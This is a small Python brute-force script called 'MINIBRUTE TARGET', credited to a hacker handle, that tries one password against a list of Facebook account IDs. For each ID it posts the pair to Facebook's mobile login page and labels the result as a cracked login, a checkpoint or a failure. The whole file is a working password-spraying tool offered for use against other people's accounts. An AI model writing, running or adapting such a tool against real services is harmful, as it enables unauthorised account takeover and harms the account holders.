m="\033[1;31m"
p="\033[1;37m"
k="\033[1;33m"
h="\033[1;32m"
pe="\033[00m"
import os
os.system("clear")
print("""

   \033[1;31m+----------------------------------------+
   \033[1;31m|      \033[00m WELCOME TO MINIBRUTE TARGET     \033[1;31m |
   \033[1;31m+----------------------------------------+
   \033[1;31m|        \033[00mCODED BY \033[0;33mASLANFORCE77           \033[1;31m|
   \033[1;31m|       \033[00mTEAM INDONESIAN NECODER          \033[1;31m|
   \033[1;31m|   \033[0;36m https://github.com/cyber-Force77    \033[1;31m|
   \033[1;31m+----------------------------------------+
""")


try:
	import requests, mechanize, bs4, sys, os
	from time import sleep
	from os import system
	from sys import exit
except ImportError as f:
	print(m+"[!] "+pe+"Error "+m+": "+pe+"%s"%(f))
if sys.version[0] in "2":
  exit("[!] error use python version 3")
  
##### Version Python
if sys.version[0] in "2":
	print(m+"[!] "+pe+"Error "+m+": "+pe+"use python version 3")

#### LIST ID PASSWORD
list = input(p+"Input list ID       "+m+"> "+k)
pasw = input(p+"Password To Crack   "+m+"> "+k)

def brute(list,pasw):
	link = "https://m.facebook.com/login.php"
	data = {"email":list, "pass":pasw}
	r = requests.post(link, data=data)
	if "m_sess" in r.url:
		print(h+"[OK] "+p+list+" "+p+"=> "+h+pasw)
	elif "checkpoint" in r.url:
		print(k+"[CP] "+p+list+" => "+k+pasw)
	else:
		print(m+"[FL] "+p+list)

def main(list,pasw):
	file = open(list, "r").readlines()
	for i in file:
		brute(i.strip(),pasw)
try:
	main(list,pasw)
except:
	exit()

